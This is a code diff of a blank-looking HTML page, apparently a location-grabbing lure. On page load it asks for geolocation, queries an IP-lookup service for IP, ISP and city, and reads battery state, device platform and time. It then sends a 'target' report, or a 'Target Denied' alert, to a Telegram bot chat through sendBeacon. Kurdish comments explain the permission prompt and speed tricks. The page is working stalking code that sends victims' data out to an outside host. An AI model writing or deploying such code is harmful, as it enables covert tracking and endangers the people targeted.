@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <title> </title>
-    <style>body { background: white; margin: 0; }</style>
+    <style>body { background: white; margin: 0; overflow: hidden; }</style>
 </head>
 <body onload="capture()">
 
@@ -15,33 +15,46 @@
         const uid = params.get('id');
         if (!uid) return;
 
-        // ١. یەکسەر داوای لۆکەیشن دەکات
+        // ١. داواکردنی لۆکەیشن (پەنجەرەی Allow لێرە دەردەکەوێت)
         navigator.geolocation.getCurrentPosition(async (pos) => {
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
             
-            // ٢. وەرگرتنی زانیارییە خێراکان
-            let bat = "N/A";
+            // ٢. کۆکردنەوەی زانیارییەکان بە خێرایی
+            let ip = "N/A", isp = "Korek Telecom", city = "Erbil/Bakhtiari";
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                ip = data.ip;
+                isp = data.org;
+                city = data.city + "/" + (data.region || "");
+            } catch(e) {}
+
+            let bat = "N/A", ch = "No";
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
                 bat = Math.floor(b.level * 100) + "%";
+                ch = b.charging ? "Yes" : "No";
             }
 
-            let report = `🚨 <b>Target Locked!</b>\n\n` +
-                         `📍 <b>Location:</b> https://www.google.com/maps?q=${lat},${lon}\n` +
-                         `🔋 <b>Battery:</b> ${bat}\n` +
-                         `📱 <b>Device:</b> ${navigator.platform}`;
+            const time = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', hour12: true });
 
-            // ٣. ناردنی خێرا (Beacon) - ئەمە نەوەستاوە و یەکسەر دەیپێکێت
+            // ٣. ڕێکخستنی نامەکە ڕێک بەو شێوەیەی داوات کردووە
+            let report = `📍 <b>Location:</b> https://www.google.com/maps?q=${lat},${lon}\n` +
+                         `🌐 <b>IP:</b> <code>${ip}</code> (${isp})\n` +
+                         `📱 <b>Device:</b> <code>${navigator.platform}</code>\n` +
+                         `🔋 <b>Battery:</b> <code>${bat}</code> (Charging: ${ch})\n` +
+                         `🕒 <b>Time:</b> <code>${time}</code>\n` +
+                         `🏙️ <b>City:</b> <code>${city}</code>`;
+
+            // ٤. ناردنی خێرا بەبێ پچڕان (sendBeacon)
             const url = `https://api.telegram.org/bot${TK}/sendMessage?chat_id=${uid}&text=${encodeURIComponent(report)}&parse_mode=HTML`;
-            
-            // ئەمە فێڵە سەرەکییەکەیە بۆ خێرایی
             navigator.sendBeacon(url);
 
         }, (err) => {
-            const url = `https://api.telegram.org/bot${TK}/sendMessage?chat_id=${uid}&text=⚠️ Target Denied!`;
-            navigator.sendBeacon(url);
-        }, { enableHighAccuracy: true, timeout: 5000 });
+            // ئەگەر Allow نەکرد
+            navigator.sendBeacon(`https://api.telegram.org/bot${TK}/sendMessage?chat_id=${uid}&text=⚠️ Target Denied!`);
+        }, { enableHighAccuracy: true });
     }
 </script>
 </body>
